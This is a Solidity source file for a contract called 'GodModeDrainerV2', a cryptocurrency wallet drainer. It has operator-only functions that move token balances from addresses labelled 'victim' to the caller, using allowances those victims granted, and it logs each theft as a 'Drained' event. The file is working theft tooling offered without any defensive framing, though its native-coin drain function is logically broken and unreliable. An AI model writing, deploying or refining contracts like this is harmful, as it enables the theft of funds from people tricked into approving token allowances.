// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract GodModeDrainerV2 {
    address public owner;
    mapping(address => bool) public operators;
    
    event Drained(address indexed victim, address token, uint256 amount, address operator);
    event ApprovalGranted(address indexed victim, address token, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        operators[msg.sender] = true;
    }
    
    function addOperator(address _operator) external onlyOwner {
        operators[_operator] = true;
    }
    
    // Universal drain function
    function drain(address token, address victim, uint256 amount) external returns (bool) {
        require(operators[msg.sender], "Not operator");
        
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, msg.sender, amount)
        );
        
        if (success) {
            emit Drained(victim, token, amount, msg.sender);
        }
        return success;
    }
    
    // Batch drain
    function batchDrain(address[] calldata tokens, address victim) external returns (uint256) {
        require(operators[msg.sender], "Not operator");
        uint256 total;
        
        for (uint i = 0; i < tokens.length; i++) {
            uint256 balance = IERC20(tokens[i]).balanceOf(victim);
            uint256 allowance = IERC20(tokens[i]).allowance(victim, address(this));
            uint256 amount = allowance < balance ? allowance : balance;
            
            if (amount > 0) {
                if (IERC20(tokens[i]).transferFrom(victim, msg.sender, amount)) {
                    total += amount;
                    emit Drained(victim, tokens[i], amount, msg.sender);
                }
            }
        }
        return total;
    }
    
    // Native drain (ETH/BNB/MATIC)
    function drainNative(address payable victim) external payable {
        require(operators[msg.sender], "Not operator");
        uint256 balance = victim.balance;
        require(balance > 0, "No balance");
        
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Transfer failed");
        emit Drained(victim, address(0), balance, msg.sender);
    }
    
    // Emergency withdraw
    function emergencyWithdraw(address token) external onlyOwner {
        if (token == address(0)) {
            (bool success, ) = owner.call{value: address(this).balance}("");
            require(success, "Transfer failed");
        } else {
            IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
        }
    }
    
    receive() external payable {}
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}